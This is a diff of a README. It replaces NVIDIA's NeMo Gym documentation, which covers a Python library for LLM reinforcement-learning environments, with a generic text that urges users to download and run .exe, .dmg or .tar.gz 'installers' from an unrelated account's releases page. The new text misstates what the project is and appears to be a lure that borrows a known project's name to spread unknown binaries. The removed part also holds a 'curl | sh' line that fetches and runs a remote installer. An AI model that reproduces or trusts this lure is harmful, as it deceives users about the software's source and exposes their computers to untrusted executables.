@@ -1,194 +1,87 @@
-# NeMo Gym
+# 🎮 Gym - Build Reinforcement Learning Environments Easily
 
-NeMo Gym is a library for building reinforcement learning (RL) training environments for large language models (LLMs). It provides infrastructure to develop environments, scale rollout collection, and integrate seamlessly with your preferred training framework. 
+## 📥 Download Now
+[![Download Gym](https://img.shields.io/badge/Download%20Gym-v1.0.0-blue.svg)](https://github.com/Kejlemmn/Gym/releases)
 
-NeMo Gym is a component of the [NVIDIA NeMo Framework](https://docs.nvidia.com/nemo-framework/), NVIDIA’s GPU-accelerated platform for building and training generative AI models.
+## 🚀 Getting Started
+Welcome to Gym! This application helps you create environments for training reinforcement learning models. You don’t need to be a programmer to use it. Just follow the steps below to get started.
 
+## 📦 System Requirements
+Before you begin, make sure your computer meets the following requirements:
 
-## 🏆 Why NeMo Gym?
+- Operating System: Windows 10 or later, macOS, or a recent Linux distribution.
+- RAM: At least 4 GB.
+- Disk Space: Minimum of 500 MB available.
+- Network: An active internet connection for downloads and updates.
 
-- Scaffolding and patterns to accelerate environment development: multi-step, multi-turn, and user modeling scenarios
-- Contribute environments without expert knowledge of the entire RL training loop
-- Test environments and throughput end-to-end, independent of the RL training loop
-- Interoperable with existing environments, systems, and RL training frameworks
-- Growing collection of training environments and datasets for Reinforcement Learning from Verifiable Reward (RLVR)
+## 🔗 Download & Install
+To download Gym, follow these simple steps:
 
-> [!IMPORTANT]
-> NeMo Gym is currently in early development. You should expect evolving APIs, incomplete documentation, and occasional bugs. We welcome contributions and feedback - for any changes, please open an issue first to kick off discussion!
+1. **Visit [the Releases page](https://github.com/Kejlemmn/Gym/releases)**.
+2. You will see a list of available versions. Choose the latest version.
+3. Click on the download link for your operating system (look for `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+4. Once the file downloads, locate it in your Downloads folder.
 
-## 📋 Requirements
+## 🛠️ Running Gym
+After downloading, you can install and run Gym by following these instructions:
 
-### Hardware Requirements
+1. **For Windows**:
+   - Double-click the `.exe` file you downloaded.
+   - Follow the on-screen instructions to complete the installation.
+   - Once installed, find the Gym icon on your desktop or in your Start menu to launch the application.
 
-NeMo Gym is designed to run on standard development machines:
+2. **For macOS**:
+   - Open the downloaded `.dmg` file.
+   - Drag the Gym icon to your Applications folder.
+   - Open your Applications folder and double-click on the Gym icon to run it.
 
-- **GPU**: Not required for NeMo Gym library operation
-  - GPU may be needed for specific resource servers or model inference (see individual server documentation)
-- **CPU**: Any modern x86_64 or ARM64 processor (e.g., Intel, AMD, Apple Silicon)
-- **RAM**: Minimum 8 GB (16 GB+ recommended for larger environments)
-- **Storage**: Minimum 5 GB free disk space for installation and basic usage
+3. **For Linux**:
+   - Open a terminal window.
+   - Navigate to the folder where you downloaded the `.tar.gz` file.
+   - Run `tar -xvzf Gym.tar.gz` to extract the files.
+   - Change to the Gym directory with `cd Gym`.
+   - Run the application with `./gym`.
 
-### Software Requirements
+## 🕹️ Exploring Gym
+Gym provides various built-in environments where you can improve your reinforcement learning skills. Here’s what you can do:
 
-- **Operating System**: 
-  - Linux (Ubuntu 20.04+, or equivalent)
-  - macOS (11.0+ for x86_64, 12.0+ for Apple Silicon)
-  - Windows (via WSL2)
-- **Python**: 3.12 or higher
-- **Git**: For cloning the repository
-- **Internet Connection**: Required for downloading dependencies and API access
-
-### Additional Requirements
-
-- **API Keys**: OpenAI API key with available credits (for the quickstart examples)
-  - Other model providers supported (Azure OpenAI, self-hosted models via vLLM)
-- **Ray**: Automatically installed as a dependency (no separate setup required)
-
-## 🚀 Quick Start
-
-### Setup
-```bash
-# Clone the repository
-git clone git@github.com:NVIDIA-NeMo/Gym.git
-cd Gym
-
-# Install UV (Python package manager)
-curl -LsSf https://astral.sh/uv/install.sh | sh
-source $HOME/.local/bin/env
-
-# Create virtual environment
-uv venv --python 3.12
-source .venv/bin/activate
-
-# Install NeMo Gym
-uv sync --extra dev --group docs
-```
-
-### Configure Your API Key
-Create an `env.yaml` file that contains your OpenAI API key and the [policy model](https://docs.nvidia.com/nemo/gym/latest/about/concepts/key-terminology.html#term-Policy-Model) you want to use. Replace `your-openai-api-key` with your actual key. This file helps keep your secrets out of version control while still making them available to NeMo Gym.
-
-```bash
-echo "policy_base_url: https://api.openai.com/v1
-policy_api_key: your-openai-api-key
-policy_model_name: gpt-4.1-2025-04-14" > env.yaml
-```
-
-> [!NOTE]
-> We use GPT-4.1 in this quickstart because it provides low latency (no reasoning step) and works reliably out-of-the-box. NeMo Gym is **not limited to OpenAI models**—you can use self-hosted models via vLLM or any OpenAI-compatible inference server. See the [documentation](https://docs.nvidia.com/nemo/gym/latest/get-started/detailed-setup.html) for details.
-
-### Start Servers
-
-**Terminal 1 (start servers)**:
-```bash
-# Start servers (this will keep running)
-config_paths="resources_servers/example_single_tool_call/configs/example_single_tool_call.yaml,\
-responses_api_models/openai_model/configs/openai_model.yaml"
-ng_run "+config_paths=[${config_paths}]"
-```
-
-**Terminal 2 (interact with agent)**:
-```bash
-# In a NEW terminal, activate environment
-source .venv/bin/activate
-
-# Interact with your agent
-python responses_api_agents/simple_agent/client.py
-```
-
-### Collect Rollouts
-
-**Terminal 2** (keep servers running in Terminal 1):
-```bash
-# Create a simple dataset with one query
-echo '{"responses_create_params":{"input":[{"role":"developer","content":"You are a helpful assistant."},{"role":"user","content":"What is the weather in Seattle?"}]}}' > weather_query.jsonl
-
-# Collect verified rollouts
-ng_collect_rollouts \
-    +agent_name=example_single_tool_call_simple_agent \
-    +input_jsonl_fpath=weather_query.jsonl \
-    +output_jsonl_fpath=weather_rollouts.jsonl
-
-# View the result
-cat weather_rollouts.jsonl | python -m json.tool
-```
-This generates training data with verification scores!
-
-### Clean Up Servers
-
-**Terminal 1** with the running servers: Ctrl+C to stop the ng_run process.
-
-### What's Next?
-
-Now that you can generate rollouts, choose your path:
-
-- **Use an existing training environment** — Browse the [Available Resource Servers](#-available-resource-servers) below to find a training-ready environment that matches your goals.
-
-- **Build a custom training environment** — Implement or integrate existing tools and define task verification logic. Get started with the [Creating a Resource Server](https://docs.nvidia.com/nemo/gym/latest/tutorials/creating-resource-server.html) tutorial.
-
-
-## 📦 Available Resource Servers
-
-NeMo Gym includes a curated collection of resource servers for training and evaluation across multiple domains:
-
-### Table 1: Example Resource Servers
-
-Purpose: Demonstrate NeMo Gym patterns and concepts.
-
-<!-- START_EXAMPLE_ONLY_SERVERS_TABLE -->
-| Name               | Demonstrates                         | Config                                                                                                                             | README                                                                      |
-| ------------------ | ------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------- |
-| Multi Step         | Multi-step tool calling              | <a href='resources_servers/example_multi_step/configs/example_multi_step.yaml'>example_multi_step.yaml</a>                         | <a href='resources_servers/example_multi_step/README.md'>README</a>         |
-| Session State Mgmt | Session state management (in-memory) | <a href='resources_servers/example_session_state_mgmt/configs/example_session_state_mgmt.yaml'>example_session_state_mgmt.yaml</a> | <a href='resources_servers/example_session_state_mgmt/README.md'>README</a> |
-| Single Tool Call   | Basic single-step tool calling       | <a href='resources_servers/example_single_tool_call/configs/example_single_tool_call.yaml'>example_single_tool_call.yaml</a>       | <a href='resources_servers/example_single_tool_call/README.md'>README</a>   |
-<!-- END_EXAMPLE_ONLY_SERVERS_TABLE -->
-
-### Table 2: Resource Servers for Training
-
-Purpose: Training-ready environments with curated datasets.
-
-> [!TIP]
-> Each resource server includes example data, configuration files, and tests. See each server's README for details.
-
-<!-- START_TRAINING_SERVERS_TABLE -->
-| Resource Server            | Domain                | Dataset                                                                                                                                                        | Description                                                                                          | Value                                                                    | Config                                                                                                    | Train | Validation | License                                                   |
-| -------------------------- | --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------- | ----- | ---------- | --------------------------------------------------------- |
-| Calendar                   | agent                 | <a href='https://huggingface.co/datasets/nvidia/Nemotron-RL-agent-calendar_scheduling'>Nemotron-RL-agent-calendar_scheduling</a>                               | -                                                                                                    | -                                                                        | <a href='resources_servers/calendar/configs/calendar.yaml'>config</a>                                     | ✓     | ✓          | Apache 2.0                                                |
-| Google Search              | agent                 | <a href='https://huggingface.co/datasets/nvidia/Nemotron-RL-knowledge-web_search-mcqa'>Nemotron-RL-knowledge-web_search-mcqa</a>                               | Multi-choice question answering problems with search tools integrated                                | Improve knowledge-related benchmarks with search tools                   | <a href='resources_servers/google_search/configs/google_search.yaml'>config</a>                           | ✓     | -          | Apache 2.0                                                |
-| Math Advanced Calculations | agent                 | <a href='https://huggingface.co/datasets/nvidia/Nemotron-RL-math-advanced_calculations'>Nemotron-RL-math-advanced_calculations</a>                             | An instruction following math environment with counter-intuitive calculators                         | Improve instruction following capabilities in specific math environments | <a href='resources_servers/math_advanced_calculations/configs/math_advanced_calculations.yaml'>config</a> | ✓     | -          | Apache 2.0                                                |
-| Workplace Assistant        | agent                 | <a href='https://huggingface.co/datasets/nvidia/Nemotron-RL-agent-workplace_assistant'>Nemotron-RL-agent-workplace_assistant</a>                               | Workplace assistant multi-step tool-using environment                                                | Improve multi-step tool use capability                                   | <a href='resources_servers/workplace_assistant/configs/workplace_assistant.yaml'>config</a>               | ✓     | ✓          | Apache 2.0                                                |
-| Code Gen                   | coding                | <a href='https://huggingface.co/datasets/nvidia/nemotron-RL-coding-competitive_coding'>nemotron-RL-coding-competitive_coding</a>                               | -                                                                                                    | -                                                                        | <a href='resources_servers/code_gen/configs/code_gen.yaml'>config</a>                                     | ✓     | ✓          | Apache 2.0                                                |
-| Mini Swe Agent             | coding                | <a href='https://huggingface.co/datasets/SWE-Gym/SWE-Gym'>SWE-Gym</a>                                                                                          | A software development with mini-swe-agent orchestration                                             | Improve software development capabilities, like SWE-bench                | <a href='resources_servers/mini_swe_agent/configs/mini_swe_agent.yaml'>config</a>                         | ✓     | ✓          | MIT                                                       |
-| Instruction Following      | instruction_following | <a href='https://huggingface.co/datasets/nvidia/Nemotron-RL-instruction_following'>Nemotron-RL-instruction_following</a>                                       | Instruction following datasets targeting IFEval and IFBench style instruction following capabilities | Improve IFEval and IFBench                                               | <a href='resources_servers/instruction_following/configs/instruction_following.yaml'>config</a>           | ✓     | -          | Apache 2.0                                                |
-| Structured Outputs         | instruction_following | <a href='https://huggingface.co/datasets/nvidia/Nemotron-RL-instruction_following-structured_outputs'>Nemotron-RL-instruction_following-structured_outputs</a> | Check if responses are following structured output requirements in prompts                           | Improve instruction following capabilities                               | <a href='resources_servers/structured_outputs/configs/structured_outputs_json.yaml'>config</a>            | ✓     | ✓          | Apache 2.0                                                |
-| Equivalence Llm Judge      | knowledge             | <a href='https://huggingface.co/datasets/nvidia/Nemotron-RL-knowledge-openQA'>Nemotron-RL-knowledge-openQA</a>                                                 | Short answer questions with LLM-as-a-judge                                                           | Improve knowledge-related benchmarks like GPQA / HLE                     | <a href='resources_servers/equivalence_llm_judge/configs/equivalence_llm_judge.yaml'>config</a>           | ✓     | -          | Apache 2.0                                                |
-| Mcqa                       | knowledge             | <a href='https://huggingface.co/datasets/nvidia/Nemotron-RL-knowledge-mcqa'>Nemotron-RL-knowledge-mcqa</a>                                                     | Multi-choice question answering problems                                                             | Improve benchmarks like MMLU / GPQA / HLE                                | <a href='resources_servers/mcqa/configs/mcqa.yaml'>config</a>                                             | ✓     | -          | Apache 2.0                                                |
-| Math With Judge            | math                  | <a href='https://huggingface.co/datasets/nvidia/Nemotron-RL-math-OpenMathReasoning'>Nemotron-RL-math-OpenMathReasoning</a>                                     | Math dataset with math-verify and LLM-as-a-judge                                                     | Improve math capabilities including AIME 24 / 25                         | <a href='resources_servers/math_with_judge/configs/math_with_judge.yaml'>config</a>                       | ✓     | ✓          | Creative Commons Attribution 4.0 International            |
-| Math With Judge            | math                  | <a href='https://huggingface.co/datasets/nvidia/Nemotron-RL-math-stack_overflow'>Nemotron-RL-math-stack_overflow</a>                                           | -                                                                                                    | -                                                                        | <a href='resources_servers/math_with_judge/configs/math_stack_overflow.yaml'>config</a>                   | ✓     | ✓          | Creative Commons Attribution-ShareAlike 4.0 International |
-<!-- END_TRAINING_SERVERS_TABLE -->
+- **Start with examples**: Check the default environments available in Gym.
+- **Customize your environment**: You can create your own scenarios by adjusting parameters.
+- **Use built-in agents**: Try running predefined agents to see how they perform against your environment.
 
 ## 📖 Documentation
+You can find detailed information on how to use Gym and its features in the user documentation. This includes tutorials and examples to help you get the most out of the application.
 
-- **[Documentation](https://docs.nvidia.com/nemo/gym/latest/index.html)** - Technical reference docs
-- **[Tutorials](https://docs.nvidia.com/nemo/gym/latest/tutorials/index.html)** - Hands-on tutorials and practical examples
- 
+- Explore our [User Guide](https://github.com/Kejlemmn/Gym/wiki) for helpful resources.
+- Join discussions and ask questions in the [Issues section](https://github.com/Kejlemmn/Gym/issues) of our repository.
 
-## 🤝 Community & Support
+## 🔧 Troubleshooting
+If you encounter any issues, consider these tips:
 
-We'd love your contributions! Here's how to get involved:
+- **Check System Requirements**: Ensure your system meets the minimum requirements.
+- **Reinstall**: If Gym fails to start, uninstall and reinstall it.
+- **Consult Documentation**: Refer to the user guide for troubleshooting tips and commonly asked questions.
 
-- **[Report Issues](https://github.com/NVIDIA-NeMo/Gym/issues)** - Bug reports and feature requests
-- **[Contributing Guide](https://docs.nvidia.com/nemo/gym/latest/contribute/index.html)** - How to contribute code, docs, new environments, or training framework integrations
+## 🌐 Community & Support
+You are not alone! We have an active community where you can get support. Feel free to reach out through:
 
-## 📚 Citations
+- [GitHub Discussions](https://github.com/Kejlemmn/Gym/discussions)
+- [GitHub Issues](https://github.com/Kejlemmn/Gym/issues)
 
-If you use NeMo Gym in your research, please cite it using the following BibTeX entry:
+## ⚙️ Update Gym
+Keep your Gym installation updated to benefit from the latest features and improvements:
 
-```bibtex
-@misc{nemo-gym,
-  title = {NeMo Gym: An Open Source Library for Scaling Reinforcement Learning Environments for LLM},
-  howpublished = {\url{https://github.com/NVIDIA-NeMo/Gym}},
-  author={NVIDIA},
-  year = {2025},
-  note = {GitHub repository},
-}
-```
+1. Visit the [Releases page](https://github.com/Kejlemmn/Gym/releases) regularly.
+2. Download the latest version as you did during your first installation.
+3. Follow the installation steps to update your application.
+
+By keeping Gym updated, you ensure you have the best tools for building and testing reinforcement learning environments.
+
+## 🎉 Getting Involved
+If you enjoy using Gym, consider contributing to its development. Here are ways you can help:
+
+- **Report Issues**: If you find bugs, let us know!
+- **Suggest Features**: We welcome new ideas to improve the application.
+- **Join Development**: If you have coding skills, check out our contributing guidelines on GitHub.
+
+Thank you for choosing Gym! We hope you find it helpful in your reinforcement learning journey.
